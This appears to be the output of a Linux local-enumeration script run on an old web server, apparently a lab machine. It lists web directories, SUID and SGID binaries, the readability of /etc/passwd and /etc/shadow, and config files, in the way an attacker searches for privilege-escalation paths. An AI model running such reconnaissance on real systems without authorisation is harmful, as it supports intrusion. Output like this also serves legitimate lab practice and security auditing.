+-rw-r--r--   1 root root 8.4K Sep  6  2004 mod_status.html.ja.euc-jp
+-rw-r--r--   1 root root 7.6K Sep  7  2004 mod_status.html.ko.euc-kr
+-rw-r--r--   1 root root  275 Jul 29  2004 mod_suexec.html
+-rw-r--r--   1 root root 5.2K May  7  2004 mod_suexec.html.en
+-rw-r--r--   1 root root 5.3K Jul 29  2004 mod_suexec.html.ja.euc-jp
+-rw-r--r--   1 root root 5.0K May  7  2004 mod_suexec.html.ko.euc-kr
+-rw-r--r--   1 root root  284 Jul 29  2004 mod_unique_id.html
+-rw-r--r--   1 root root  13K May  7  2004 mod_unique_id.html.en
+-rw-r--r--   1 root root  12K Jul 29  2004 mod_unique_id.html.ja.euc-jp
+-rw-r--r--   1 root root  11K May  7  2004 mod_unique_id.html.ko.euc-kr
+-rw-r--r--   1 root root  278 Jul 29  2004 mod_userdir.html
+-rw-r--r--   1 root root 8.5K May  7  2004 mod_userdir.html.en
+-rw-r--r--   1 root root 8.5K Jul 29  2004 mod_userdir.html.ja.euc-jp
+-rw-r--r--   1 root root 7.7K May  7  2004 mod_userdir.html.ko.euc-kr
+-rw-r--r--   1 root root   92 Jul  5  2003 mod_usertrack.html
+-rw-r--r--   1 root root  15K Feb 20  2004 mod_usertrack.html.en
+-rw-r--r--   1 root root   94 Jul  5  2003 mod_vhost_alias.html
+-rw-r--r--   1 root root  17K Apr  3  2004 mod_vhost_alias.html.en
+-rw-r--r--   1 root root  278 Jul 29  2004 module-dict.html
+-rw-r--r--   1 root root 6.8K May  7  2004 module-dict.html.en
+-rw-r--r--   1 root root 6.8K Jul 29  2004 module-dict.html.ja.euc-jp
+-rw-r--r--   1 root root 6.0K May  7  2004 module-dict.html.ko.euc-kr
+-rw-r--r--   1 root root  272 Jul 29  2004 mpm_common.html
+-rw-r--r--   1 root root  70K Mar 15  2004 mpm_common.html.de
+-rw-r--r--   1 root root  65K Mar 15  2004 mpm_common.html.en
+-rw-r--r--   1 root root  47K Jul 29  2004 mpm_common.html.ja.euc-jp
+-rw-r--r--   1 root root   90 Jul  5  2003 mpm_netware.html
+-rw-r--r--   1 root root 8.3K Feb 20  2004 mpm_netware.html.en
+-rw-r--r--   1 root root  358 Jul 29  2004 mpm_winnt.html
+-rw-r--r--   1 root root 6.9K May 30  2004 mpm_winnt.html.de
+-rw-r--r--   1 root root 6.7K May 30  2004 mpm_winnt.html.en
+-rw-r--r--   1 root root 7.0K May 30  2004 mpm_winnt.html.es
+-rw-r--r--   1 root root 6.7K Sep  6  2004 mpm_winnt.html.ja.euc-jp
+-rw-r--r--   1 root root   87 Jul  5  2003 mpmt_os2.html
+-rw-r--r--   1 root root 4.9K Feb 20  2004 mpmt_os2.html.en
+-rw-r--r--   1 root root   87 Jul  5  2003 perchild.html
+-rw-r--r--   1 root root  17K Mar 22  2004 perchild.html.en
+-rw-r--r--   1 root root  350 Jul 29  2004 prefork.html
+-rw-r--r--   1 root root  14K May 18  2004 prefork.html.de
+-rw-r--r--   1 root root  13K May 18  2004 prefork.html.en
+-rw-r--r--   1 root root  14K May 18  2004 prefork.html.es
+-rw-r--r--   1 root root  13K Sep  6  2004 prefork.html.ja.euc-jp
+-rw-r--r--   1 root root  572 Jul 29  2004 quickreference.html
+-rw-r--r--   1 root root  95K Sep 21  2004 quickreference.html.de
+-rw-r--r--   1 root root  94K Sep 21  2004 quickreference.html.en
+-rw-r--r--   1 root root  94K Sep 21  2004 quickreference.html.es
+-rw-r--r--   1 root root  92K Sep 21  2004 quickreference.html.ja.euc-jp
+-rw-r--r--   1 root root  92K Sep 22  2004 quickreference.html.ko.euc-kr
+-rw-r--r--   1 root root  94K Sep 21  2004 quickreference.html.ru.koi8-r
+-rw-r--r--   1 root root   89 Jul  5  2003 threadpool.html
+-rw-r--r--   1 root root 6.3K Mar 15  2004 threadpool.html.en
+-rw-r--r--   1 root root  346 Jul 29  2004 worker.html
+-rw-r--r--   1 root root  13K May 18  2004 worker.html.de
+-rw-r--r--   1 root root  13K May 18  2004 worker.html.en
+-rw-r--r--   1 root root  13K May 18  2004 worker.html.es
+-rw-r--r--   1 root root  13K Sep  6  2004 worker.html.ja.euc-jp
+
+/var/www/manual/mod/mod_python:
+total 1.2M
+drwxr-xr-x  3 root root 4.0K Oct  7  2009 .
+drwxr-xr-x  3 root root  12K Oct  7  2009 ..
+-rw-r--r--  1 root root 3.8K Feb 23  2004 about.html
+-rw-r--r--  1 root root 3.9K Feb 23  2004 app-changes.html
+-rw-r--r--  1 root root 8.2K Feb 23  2004 contents.html
+-rw-r--r--  1 root root 4.1K Feb 23  2004 dir-conn-ch.html
+-rw-r--r--  1 root root 3.5K Feb 23  2004 dir-conn.html
+-rw-r--r--  1 root root 4.2K Feb 23  2004 dir-filter-if.html
+-rw-r--r--  1 root root 4.2K Feb 23  2004 dir-filter-of.html
+-rw-r--r--  1 root root 3.6K Feb 23  2004 dir-filter.html
+-rw-r--r--  1 root root 4.3K Feb 23  2004 dir-handlers-ach.html
+-rw-r--r--  1 root root 5.4K Feb 23  2004 dir-handlers-auh.html
+-rw-r--r--  1 root root 4.2K Feb 23  2004 dir-handlers-auzh.html
+-rw-r--r--  1 root root 4.2K Feb 23  2004 dir-handlers-fuh.html
+-rw-r--r--  1 root root 4.2K Feb 23  2004 dir-handlers-hph.html
+-rw-r--r--  1 root root 4.7K Feb 23  2004 dir-handlers-pch.html
+-rw-r--r--  1 root root 4.1K Feb 23  2004 dir-handlers-ph.html
+-rw-r--r--  1 root root 4.6K Feb 23  2004 dir-handlers-pih.html
+-rw-r--r--  1 root root 4.1K Feb 23  2004 dir-handlers-plh.html
+-rw-r--r--  1 root root 5.2K Feb 23  2004 dir-handlers-prrh.html
+-rw-r--r--  1 root root 5.9K Feb 23  2004 dir-handlers-syn.html
+-rw-r--r--  1 root root 4.7K Feb 23  2004 dir-handlers-th.html
+-rw-r--r--  1 root root 4.2K Feb 23  2004 dir-handlers-tph.html
+-rw-r--r--  1 root root 4.4K Feb 23  2004 dir-handlers.html
+-rw-r--r--  1 root root 4.5K Feb 23  2004 dir-other-epd.html
+-rw-r--r--  1 root root 5.8K Feb 23  2004 dir-other-ipd.html
+-rw-r--r--  1 root root 5.2K Feb 23  2004 dir-other-ipdv.html
+-rw-r--r--  1 root root 4.7K Feb 23  2004 dir-other-par.html
+-rw-r--r--  1 root root 4.6K Feb 23  2004 dir-other-pd.html
+-rw-r--r--  1 root root 4.5K Feb 23  2004 dir-other-phm.html
+-rw-r--r--  1 root root 4.9K Feb 23  2004 dir-other-pi.html
+-rw-r--r--  1 root root 4.8K Feb 23  2004 dir-other-pimp.html
+-rw-r--r--  1 root root 4.2K Feb 23  2004 dir-other-po.html
+-rw-r--r--  1 root root 4.0K Feb 23  2004 dir-other-pomz.html
+-rw-r--r--  1 root root 5.2K Feb 23  2004 dir-other-pp.html
+-rw-r--r--  1 root root 4.1K Feb 23  2004 dir-other.html
+-rw-r--r--  1 root root 5.4K Feb 23  2004 directives.html
+-rw-r--r--  1 root root 4.7K Feb 23  2004 front.html
+-rw-r--r--  1 root root  30K Feb 23  2004 genindex.html
+-rw-r--r--  1 root root 5.5K Feb 23  2004 hand-cgi.html
+-rw-r--r--  1 root root 4.1K Feb 23  2004 hand-psp.html
+-rw-r--r--  1 root root 4.2K Feb 23  2004 hand-pub-alg-args.html
+-rw-r--r--  1 root root 7.7K Feb 23  2004 hand-pub-alg-auth.html
+-rw-r--r--  1 root root 5.7K Feb 23  2004 hand-pub-alg-trav.html
+-rw-r--r--  1 root root 3.9K Feb 23  2004 hand-pub-alg.html
+-rw-r--r--  1 root root 4.0K Feb 23  2004 hand-pub-intro.html
+-rw-r--r--  1 root root 4.0K Feb 23  2004 hand-pub.html
+-rw-r--r--  1 root root 3.9K Feb 23  2004 handlers.html
+drwxr-xr-x  2 root root 4.0K Oct  7  2009 icons
+-rw-r--r--  1 root root 8.4K Feb 23  2004 index.html
+-rw-r--r--  1 root root 3.9K Feb 23  2004 inst-apacheconfig.html
+-rw-r--r--  1 root root 4.5K Feb 23  2004 inst-compiling.html
+-rw-r--r--  1 root root 4.9K Feb 23  2004 inst-configure.html
+-rw-r--r--  1 root root 3.6K Feb 23  2004 inst-installing.html
+-rw-r--r--  1 root root 3.4K Feb 23  2004 inst-make.html
+-rw-r--r--  1 root root 4.1K Feb 23  2004 inst-makeinstall.html
+-rw-r--r--  1 root root 4.2K Feb 23  2004 inst-prerequisites.html
+-rw-r--r--  1 root root 5.3K Feb 23  2004 inst-testing.html
+-rw-r--r--  1 root root 4.0K Feb 23  2004 inst-trouble.html
+-rw-r--r--  1 root root 4.3K Feb 23  2004 installation.html
+-rw-r--r--  1 root root 4.6K Feb 23  2004 intr-flexibility.html
+-rw-r--r--  1 root root 6.0K Feb 23  2004 intr-history.html
+-rw-r--r--  1 root root 4.1K Feb 23  2004 intr-performance.html
+-rw-r--r--  1 root root 3.5K Feb 23  2004 introduction.html
+-rw-r--r--  1 root root 4.1K Feb 23  2004 modpython.css
+-rw-r--r--  1 root root 8.4K Feb 23  2004 modpython.html
+-rw-r--r--  1 root root 5.6K Feb 23  2004 module-apache.html
+-rw-r--r--  1 root root 3.8K Feb 23  2004 node92.html
+-rw-r--r--  1 root root 8.7K Feb 23  2004 pyapi-apmeth.html
+-rw-r--r--  1 root root 4.0K Feb 23  2004 pyapi-conn.html
+-rw-r--r--  1 root root 8.2K Feb 23  2004 pyapi-cookie-classes.html
+-rw-r--r--  1 root root 4.9K Feb 23  2004 pyapi-cookie-example.html
+-rw-r--r--  1 root root 5.2K Feb 23  2004 pyapi-cookie-func.html
+-rw-r--r--  1 root root 5.7K Feb 23  2004 pyapi-cookie.html
+-rw-r--r--  1 root root 6.1K Feb 23  2004 pyapi-filter.html
+-rw-r--r--  1 root root 7.8K Feb 23  2004 pyapi-handler.html
+-rw-r--r--  1 root root 6.5K Feb 23  2004 pyapi-interps.html
+-rw-r--r--  1 root root 5.9K Feb 23  2004 pyapi-mpconn-mem.html
+-rw-r--r--  1 root root 4.6K Feb 23  2004 pyapi-mpconn-meth.html
+-rw-r--r--  1 root root 3.8K Feb 23  2004 pyapi-mpconn.html
+-rw-r--r--  1 root root 4.1K Feb 23  2004 pyapi-mpfilt-mem.html
+-rw-r--r--  1 root root 4.9K Feb 23  2004 pyapi-mpfilt-meth.html
+-rw-r--r--  1 root root 3.9K Feb 23  2004 pyapi-mpfilt.html
+-rw-r--r--  1 root root  16K Feb 23  2004 pyapi-mprequest-mem.html
+-rw-r--r--  1 root root  15K Feb 23  2004 pyapi-mprequest-meth.html
+-rw-r--r--  1 root root 4.0K Feb 23  2004 pyapi-mprequest.html
+-rw-r--r--  1 root root 3.8K Feb 23  2004 pyapi-mpserver.html
+-rw-r--r--  1 root root 6.2K Feb 23  2004 pyapi-mpsrv-mem.html
+-rw-r--r--  1 root root 4.0K Feb 23  2004 pyapi-mpsrv-meth.html
+-rw-r--r--  1 root root 5.1K Feb 23  2004 pyapi-mptable.html
+-rw-r--r--  1 root root  14K Feb 23  2004 pyapi-psp.html
+-rw-r--r--  1 root root  13K Feb 23  2004 pyapi-sess-classes.html
+-rw-r--r--  1 root root 4.4K Feb 23  2004 pyapi-sess.html
+-rw-r--r--  1 root root 5.7K Feb 23  2004 pyapi-util-fstor-fld.html
+-rw-r--r--  1 root root 7.6K Feb 23  2004 pyapi-util-fstor.html
+-rw-r--r--  1 root root 6.4K Feb 23  2004 pyapi-util-funcs.html
+-rw-r--r--  1 root root 4.5K Feb 23  2004 pyapi-util.html
+-rw-r--r--  1 root root 5.7K Feb 23  2004 pythonapi.html
+-rw-r--r--  1 root root 6.8K Feb 23  2004 tut-more-complicated.html
+-rw-r--r--  1 root root 5.4K Feb 23  2004 tut-overview.html
+-rw-r--r--  1 root root 7.4K Feb 23  2004 tut-pub.html
+-rw-r--r--  1 root root 9.1K Feb 23  2004 tut-what-it-do.html
+-rw-r--r--  1 root root 4.2K Feb 23  2004 tutorial.html
+
+/var/www/manual/mod/mod_python/icons:
+total 128K
+drwxr-xr-x  2 root root 4.0K Oct  7  2009 .
+drwxr-xr-x  3 root root 4.0K Oct  7  2009 ..
+-rw-r--r--  1 root root 2.0K Feb 23  2004 blank.gif
+-rw-r--r--  1 root root 1.1K Feb 23  2004 blank.png
+-rw-r--r--  1 root root  439 Feb 23  2004 contents.gif
+-rw-r--r--  1 root root  650 Feb 23  2004 contents.png
+-rw-r--r--  1 root root  290 Feb 23  2004 index.gif
+-rw-r--r--  1 root root  530 Feb 23  2004 index.png
+-rw-r--r--  1 root root  386 Feb 23  2004 modules.gif
+-rw-r--r--  1 root root  599 Feb 23  2004 modules.png
+-rw-r--r--  1 root root  254 Feb 23  2004 next.gif
+-rw-r--r--  1 root root  512 Feb 23  2004 next.png
+-rw-r--r--  1 root root  253 Feb 23  2004 previous.gif
+-rw-r--r--  1 root root  512 Feb 23  2004 previous.png
+-rw-r--r--  1 root root  317 Feb 23  2004 up.gif
+-rw-r--r--  1 root root  578 Feb 23  2004 up.png
+
+/var/www/manual/platform:
+total 352K
+drwxr-xr-x   2 root root 4.0K Oct  7  2009 .
+drwxr-xr-x  13 root root 4.0K Oct  7  2009 ..
+-rw-r--r--   1 root root  174 May  7  2004 ebcdic.html
+-rw-r--r--   1 root root  22K May  7  2004 ebcdic.html.en
+-rw-r--r--   1 root root  20K May  7  2004 ebcdic.html.ko.euc-kr
+-rw-r--r--   1 root root  172 May  7  2004 index.html
+-rw-r--r--   1 root root 4.6K May  7  2004 index.html.en
+-rw-r--r--   1 root root 4.3K May  7  2004 index.html.ko.euc-kr
+-rw-r--r--   1 root root  176 May  7  2004 netware.html
+-rw-r--r--   1 root root  28K Jul 15  2004 netware.html.en
+-rw-r--r--   1 root root  24K Sep  6  2004 netware.html.ko.euc-kr
+-rw-r--r--   1 root root  176 May  7  2004 perf-hp.html
+-rw-r--r--   1 root root 6.3K May  7  2004 perf-hp.html.en
+-rw-r--r--   1 root root 5.6K May  7  2004 perf-hp.html.ko.euc-kr
+-rw-r--r--   1 root root  188 May  7  2004 win_compiling.html
+-rw-r--r--   1 root root  21K May  7  2004 win_compiling.html.en
+-rw-r--r--   1 root root  19K May  7  2004 win_compiling.html.ko.euc-kr
+-rw-r--r--   1 root root  176 May  7  2004 windows.html
+-rw-r--r--   1 root root  35K May  7  2004 windows.html.en
+-rw-r--r--   1 root root  30K May  7  2004 windows.html.ko.euc-kr
+
+/var/www/manual/programs:
+total 580K
+drwxr-xr-x   2 root root 4.0K Oct  7  2009 .
+drwxr-xr-x  13 root root 4.0K Oct  7  2009 ..
+-rw-r--r--   1 root root  166 May  7  2004 ab.html
+-rw-r--r--   1 root root  11K May  7  2004 ab.html.en
+-rw-r--r--   1 root root 9.8K May  7  2004 ab.html.ko.euc-kr
+-rw-r--r--   1 root root  180 May  7  2004 apachectl.html
+-rw-r--r--   1 root root 8.0K May  7  2004 apachectl.html.en
+-rw-r--r--   1 root root 7.2K May  7  2004 apachectl.html.ko.euc-kr
+-rw-r--r--   1 root root  170 May  7  2004 apxs.html
+-rw-r--r--   1 root root  17K May  7  2004 apxs.html.en
+-rw-r--r--   1 root root  16K May  7  2004 apxs.html.ko.euc-kr
+-rw-r--r--   1 root root  180 May  7  2004 configure.html
+-rw-r--r--   1 root root  47K May 26  2004 configure.html.en
+-rw-r--r--   1 root root  43K May  7  2004 configure.html.ko.euc-kr
+-rw-r--r--   1 root root  180 May  7  2004 dbmmanage.html
+-rw-r--r--   1 root root 9.8K May  7  2004 dbmmanage.html.en
+-rw-r--r--   1 root root 8.7K May  7  2004 dbmmanage.html.ko.euc-kr
+-rw-r--r--   1 root root  178 May  7  2004 htdigest.html
+-rw-r--r--   1 root root 4.9K May  7  2004 htdigest.html.en
+-rw-r--r--   1 root root 4.7K May  7  2004 htdigest.html.ko.euc-kr
+-rw-r--r--   1 root root  178 May  7  2004 htpasswd.html
+-rw-r--r--   1 root root  13K May  7  2004 htpasswd.html.en
+-rw-r--r--   1 root root  11K May  7  2004 htpasswd.html.ko.euc-kr
+-rw-r--r--   1 root root  172 May  7  2004 httpd.html
+-rw-r--r--   1 root root 9.0K May  7  2004 httpd.html.en
+-rw-r--r--   1 root root 8.3K May  7  2004 httpd.html.ko.euc-kr
+-rwxr-xr-x   1 root root  345 May  7  2004 index.html
+-rw-r--r--   1 root root 4.6K May  7  2004 index.html.en
+-rw-r--r--   1 root root 5.0K May  7  2004 index.html.es
+-rw-r--r--   1 root root 4.5K May  7  2004 index.html.ko.euc-kr
+-rw-r--r--   1 root root 4.9K May  7  2004 index.html.ru.koi8-r
+-rw-r--r--   1 root root  182 May  7  2004 logresolve.html
+-rw-r--r--   1 root root 4.3K May  7  2004 logresolve.html.en
+-rw-r--r--   1 root root 4.1K May  7  2004 logresolve.html.ko.euc-kr
+-rwxr-xr-x   1 root root  172 May  7  2004 other.html
+-rw-r--r--   1 root root 4.3K May  7  2004 other.html.en
+-rw-r--r--   1 root root 4.0K May  7  2004 other.html.ko.euc-kr
+-rw-r--r--   1 root root  182 May  7  2004 rotatelogs.html
+-rw-r--r--   1 root root 7.9K Sep  4  2004 rotatelogs.html.en
+-rw-r--r--   1 root root 7.3K Sep  6  2004 rotatelogs.html.ko.euc-kr
+-rw-r--r--   1 root root  174 May  7  2004 suexec.html
+-rw-r--r--   1 root root 4.2K May  7  2004 suexec.html.en
+-rw-r--r--   1 root root 4.0K May  7  2004 suexec.html.ko.euc-kr
+
+/var/www/manual/ssl:
+total 316K
+drwxr-xr-x   2 root root 4.0K Oct  7  2009 .
+drwxr-xr-x  13 root root 4.0K Oct  7  2009 ..
+-rw-r--r--   1 root root  172 Jul 29  2004 index.html
+-rw-r--r--   1 root root 3.9K Feb 20  2004 index.html.en
+-rw-r--r--   1 root root 3.9K Sep  4  2004 index.html.ja.euc-jp
+-rw-r--r--   1 root root   89 Jul  5  2003 ssl_compat.html
+-rw-r--r--   1 root root  20K Feb 20  2004 ssl_compat.html.en
+-rw-r--r--   1 root root   86 Jul  5  2003 ssl_faq.html
+-rw-r--r--   1 root root  54K Feb 20  2004 ssl_faq.html.en
+-rw-r--r--   1 root root   88 Jul  5  2003 ssl_howto.html
+-rw-r--r--   1 root root  14K Aug  6  2004 ssl_howto.html.en
+-rw-r--r--   1 root root  180 Sep  7  2004 ssl_intro.html
+-rw-r--r--   1 root root  33K Sep  7  2004 ssl_intro.html.en
+-rw-r--r--   1 root root  31K Sep  7  2004 ssl_intro.html.ja.euc-jp
+-rw-r--r--   1 root root 5.7K Nov  5  2001 ssl_intro_fig1.gif
+-rw-r--r--   1 root root 7.2K Apr  2  2004 ssl_intro_fig1.png
+-rw-r--r--   1 root root 2.7K Nov  5  2001 ssl_intro_fig2.gif
+-rw-r--r--   1 root root 3.2K Apr  2  2004 ssl_intro_fig2.png
+-rw-r--r--   1 root root 4.0K Nov  5  2001 ssl_intro_fig3.gif
+-rw-r--r--   1 root root 5.4K Apr  2  2004 ssl_intro_fig3.png
+
+/var/www/manual/style:
+total 56K
+drwxr-xr-x   6 root root 4.0K Oct  7  2009 .
+drwxr-xr-x  13 root root 4.0K Oct  7  2009 ..
+-rw-r--r--   1 root root  169 Sep 15  2004 build.properties
+drwxr-xr-x   2 root root 4.0K Oct  7  2009 css
+drwxr-xr-x   2 root root 4.0K May  4  2007 lang
+drwxr-xr-x   2 root root 4.0K Oct  7  2009 latex
+drwxr-xr-x   3 root root 4.0K Oct  7  2009 xsl
+
+/var/www/manual/style/css:
+total 92K
+drwxr-xr-x  2 root root 4.0K Oct  7  2009 .
+drwxr-xr-x  6 root root 4.0K Oct  7  2009 ..
+-rw-r--r--  1 root root  732 Feb  9  2004 manual-chm.css
+-rw-r--r--  1 root root 2.9K Feb  9  2004 manual-loose-100pc.css
+-rw-r--r--  1 root root  13K Apr 12  2004 manual-print.css
+-rw-r--r--  1 root root  702 Feb  9  2004 manual-zip-100pc.css
+-rw-r--r--  1 root root  690 Feb  9  2004 manual-zip.css
+-rw-r--r--  1 root root  18K Mar 27  2004 manual.css
+
+/var/www/manual/style/lang:
+total 16K
+drwxr-xr-x  2 root root 4.0K May  4  2007 .
+drwxr-xr-x  6 root root 4.0K Oct  7  2009 ..
+
+/var/www/manual/style/latex:
+total 24K
+drwxr-xr-x  2 root root 4.0K Oct  7  2009 .
+drwxr-xr-x  6 root root 4.0K Oct  7  2009 ..
+-rw-r--r--  1 root root 1.8K Jun 30  2003 atbeginend.sty
+
+/var/www/manual/style/xsl:
+total 24K
+drwxr-xr-x  3 root root 4.0K Oct  7  2009 .
+drwxr-xr-x  6 root root 4.0K Oct  7  2009 ..
+drwxr-xr-x  2 root root 4.0K May  4  2007 util
+
+/var/www/manual/style/xsl/util:
+total 16K
+drwxr-xr-x  2 root root 4.0K May  4  2007 .
+drwxr-xr-x  3 root root 4.0K Oct  7  2009 ..
+
+/var/www/manual/vhosts:
+total 492K
+drwxr-xr-x   2 root root 4.0K Oct  7  2009 .
+drwxr-xr-x  13 root root 4.0K Oct  7  2009 ..
+-rw-r--r--   1 root root  176 Jul  5  2003 details.html
+-rw-r--r--   1 root root  21K Feb 20  2004 details.html.en
+-rw-r--r--   1 root root  18K Feb 20  2004 details.html.ko.euc-kr
+-rw-r--r--   1 root root  178 Jul  5  2003 examples.html
+-rw-r--r--   1 root root  25K Aug 28  2004 examples.html.en
+-rw-r--r--   1 root root  23K Sep  6  2004 examples.html.ko.euc-kr
+-rw-r--r--   1 root root  272 Jul 29  2004 fd-limits.html
+-rw-r--r--   1 root root 6.8K Feb 20  2004 fd-limits.html.en
+-rw-r--r--   1 root root 6.8K Sep  4  2004 fd-limits.html.ja.euc-jp
+-rw-r--r--   1 root root 6.2K Feb 20  2004 fd-limits.html.ko.euc-kr
+-rw-r--r--   1 root root  518 Jul 29  2004 index.html
+-rw-r--r--   1 root root 7.4K May 30  2004 index.html.de
+-rw-r--r--   1 root root 7.1K May 30  2004 index.html.en
+-rw-r--r--   1 root root 7.8K May 30  2004 index.html.es
+-rw-r--r--   1 root root 7.1K Sep  4  2004 index.html.ja.euc-jp
+-rw-r--r--   1 root root 6.7K May 30  2004 index.html.ko.euc-kr
+-rw-r--r--   1 root root 7.4K May 30  2004 index.html.ru.koi8-r
+-rw-r--r--   1 root root  178 Jul  5  2003 ip-based.html
+-rw-r--r--   1 root root 9.4K Feb 20  2004 ip-based.html.en
+-rw-r--r--   1 root root 8.5K Feb 20  2004 ip-based.html.ko.euc-kr
+-rw-r--r--   1 root root  170 Jul  5  2003 mass.html
+-rw-r--r--   1 root root  21K Feb 20  2004 mass.html.en
+-rw-r--r--   1 root root  18K May  7  2004 mass.html.ko.euc-kr
+-rw-r--r--   1 root root  455 Jul 29  2004 name-based.html
+-rw-r--r--   1 root root  19K May 30  2004 name-based.html.de
+-rw-r--r--   1 root root  18K May 30  2004 name-based.html.en
+-rw-r--r--   1 root root  19K May 30  2004 name-based.html.es
+-rw-r--r--   1 root root  18K Sep  4  2004 name-based.html.ja.euc-jp
+-rw-r--r--   1 root root  16K May 30  2004 name-based.html.ko.euc-kr
+
+/var/www/usage:
+total 92K
+drwxr-xr-x  2 webalizer root 4.0K Oct  9  2009 .
+drwxr-xr-x  8 root      root 4.0K Oct  7  2009 ..
+-rw-r--r--  1 root      root 2.3K Oct 11  2009 ctry_usage_200910.png
+-rw-r--r--  1 root      root 2.5K Oct 11  2009 daily_usage_200910.png
+-rw-r--r--  1 root      root 1.6K Oct 11  2009 hourly_usage_200910.png
+-rw-r--r--  1 root      root 3.7K Oct 11  2009 index.html
+-rw-r--r--  1 webalizer root 1.5K Feb 21  2005 msfree.png
+-rw-r--r--  1 root      root 2.1K Oct 11  2009 usage.png
+-rw-r--r--  1 root      root  37K Oct 11  2009 usage_200910.html
+-rw-r--r--  1 webalizer root 1.3K Feb 21  2005 webalizer.png
+
+
+### INTERESTING FILES ####################################
+[-] Useful file locations:
+
+
+[-] Can we read/write sensitive files:
+-rw-r--r--  1 root root 1772 Oct 12  2009 /etc/passwd
+-rw-r--r--  1 root root 638 Oct 12  2009 /etc/group
+-rw-r--r--  1 root root 842 May 24  2004 /etc/profile
+-r--------  1 root root 1141 Oct 12  2009 /etc/shadow
+
+
+[-] SUID files:
+-r-sr-xr-x  1 root root 46076 May  2  2007 /sbin/unix_chkpwd
+-r-s--x--x  1 root root 20016 May  2  2007 /sbin/pam_timestamp_check
+-r-sr-xr-x  1 root root 301242 May  2  2007 /sbin/pwdb_chkpwd
+-rwsr-xr-x  1 root root 6096 May  2  2007 /usr/sbin/ccreds_validate
+-rws--x--x  1 root root 30760 May  2  2007 /usr/sbin/userhelper
+-rwsr-xr-x  1 root root 6668 Feb 21  2005 /usr/sbin/userisdnctl
+-r-s--x---  1 root apache 10760 May  4  2007 /usr/sbin/suexec
+-rwsr-xr-x  1 root root 15228 May  3  2007 /usr/sbin/usernetctl
+-rws--x--x  1 root root 434644 May  2  2007 /usr/libexec/openssh/ssh-keysign
+-rwsr-xr-x  1 root root 7396 May  2  2007 /usr/libexec/pt_chown
+-rwsr-xr-x  1 root root 123961 May  3  2007 /usr/kerberos/bin/ksu
+-rwsr-x---  1 root squid 9952 May  4  2007 /usr/lib/squid/pam_auth
+-rwsr-x---  1 root squid 10208 May  4  2007 /usr/lib/squid/ncsa_auth
+-rws--x--x  1 root root 18392 May  3  2007 /usr/bin/chsh
+-rwsr-xr-x  1 root root 17304 May 10  2006 /usr/bin/rcp
+---s--x--x  1 root root 93816 Aug 21  2005 /usr/bin/sudo
+-rwsr-xr-x  1 root root 117802 May  2  2007 /usr/bin/chage
+-rwsr-xr-x  1 root root 82772 Jul 12  2006 /usr/bin/crontab
+-rwsr-xr-x  1 root root 12312 May 10  2006 /usr/bin/rlogin
+-rwsr-xr-x  1 root root 8692 May 10  2006 /usr/bin/rsh
+-rwsr-xr-x  1 root root 131181 May  2  2007 /usr/bin/gpasswd
+-rwsr-xr-x  1 root root 42280 Apr 26  2006 /usr/bin/at
+-rws--x--x  1 root root 7700 May  3  2007 /usr/bin/newgrp
+-rws--x--x  1 root root 17708 May  3  2007 /usr/bin/chfn
+-rwsr-xr-x  1 root root 19597 May  3  2007 /usr/bin/lppasswd
+-rwsr-xr-x  1 root root 72261 May  2  2007 /usr/bin/sg
+-r-s--x--x  1 root root 21200 Aug 21  2005 /usr/bin/passwd
+-rwsr-xr-x  1 root root 87016 May  3  2007 /bin/mount
+-rwsr-xr-x  1 root root 12300 May  2  2007 /bin/traceroute6
+-rwsr-xr-x  1 root root 23844 Nov 23  2006 /bin/traceroute
+-rwsr-xr-x  1 root root 53612 May  3  2007 /bin/umount
+-rwsr-xr-x  1 root root 30924 May  2  2007 /bin/ping6
+-rwsr-xr-x  1 root root 33272 May  2  2007 /bin/ping
+-rwsr-xr-x  1 root root 61168 May  5  2007 /bin/su
+
+
+[-] SGID files:
+-rwxr-Sr-t  1 root root 1733 Feb  9  2012 /var/www/html/index.php
+-rwxr-Sr-t  1 root root 199 Oct  8  2009 /var/www/html/pingit.php
+-rwxr-sr-x  1 root root 11367 May  3  2007 /sbin/netreport
+-rwxr-sr-x  1 root lock 15372 Apr  4  2006 /usr/sbin/lockdev
+-rwxr-sr-x  1 root smmsp 746328 May  2  2007 /usr/sbin/sendmail.sendmail
+-rwxr-sr-x  1 root utmp 10497 Feb 21  2005 /usr/sbin/utempter
+-r-xr-sr-x  1 root tty 9752 May  5  2007 /usr/bin/wall
+-rwxr-sr-x  1 root slocate 38548 Aug 21  2005 /usr/bin/slocate
+-rwxr-sr-x  1 root mail 14636 Feb 21  2005 /usr/bin/lockfile
+-rwxr-sr-x  1 root tty 10124 May  3  2007 /usr/bin/write
+-rwxr-sr-x  1 root nobody 57932 May  2  2007 /usr/bin/ssh-agent
+
+
+[+] Possibly interesting SGID files:
+-rwxr-Sr-t  1 root root 1733 Feb  9  2012 /var/www/html/index.php
+-rwxr-Sr-t  1 root root 199 Oct  8  2009 /var/www/html/pingit.php
+
+
+[-] NFS config details: 
+-rw-r--r--  1 root root 0 Jan 12  2000 /etc/exports
+
+
+[-] NFS displaying partitions and filesystems - you need to check if exotic filesystems
+# This file is edited by fstab-sync - see 'man fstab-sync' for details
+/dev/VolGroup00/LogVol00 /                       ext3    defaults        1 1
+LABEL=/boot             /boot                   ext3    defaults        1 2
+none                    /dev/pts                devpts  gid=5,mode=620  0 0
+none                    /dev/shm                tmpfs   defaults        0 0
+none                    /proc                   proc    defaults        0 0
+none                    /sys                    sysfs   defaults        0 0
+/dev/VolGroup00/LogVol01 swap                    swap    defaults        0 0
+
+
+[-] Can't search *.conf files as no keyword was entered
+
+[-] Can't search *.php files as no keyword was entered
+
+[-] Can't search *.log files as no keyword was entered
+
+[-] Can't search *.ini files as no keyword was entered
+
+[-] All *.conf files in /etc (recursive 1 level):
+-rw-r--r--  1 root root 694 Feb 21  2005 /etc/syslog.conf
+-rw-r--r--  1 root root 401 May  5  2007 /etc/yum.conf
+-rwxr-xr-x  1 root root 1484 Jan  1  2006 /etc/request-key.conf
+-rw-r--r--  1 root root 10 Oct  7  2009 /etc/pam_smb.conf
+-rw-r--r--  1 root root 1623 Oct  7  2009 /etc/nsswitch.conf
+-rw-r--r--  1 root root 658 May  3  2007 /etc/initlog.conf
+-rw-r--r--  1 root root 216 May  3  2007 /etc/sestatus.conf
+-rw-r--r--  1 root root 28 May  2  2007 /etc/ld.so.conf
+-rw-r--r--  1 root root 3243 Feb 21  2005 /etc/lftp.conf
+-rw-r--r--  1 root root 10814 Feb 20  2006 /etc/ltrace.conf
+-rw-r--r--  1 root root 23735 Feb 21  2005 /etc/webalizer.conf
+-rw-r--r--  1 root root 604 May  3  2007 /etc/sysctl.conf
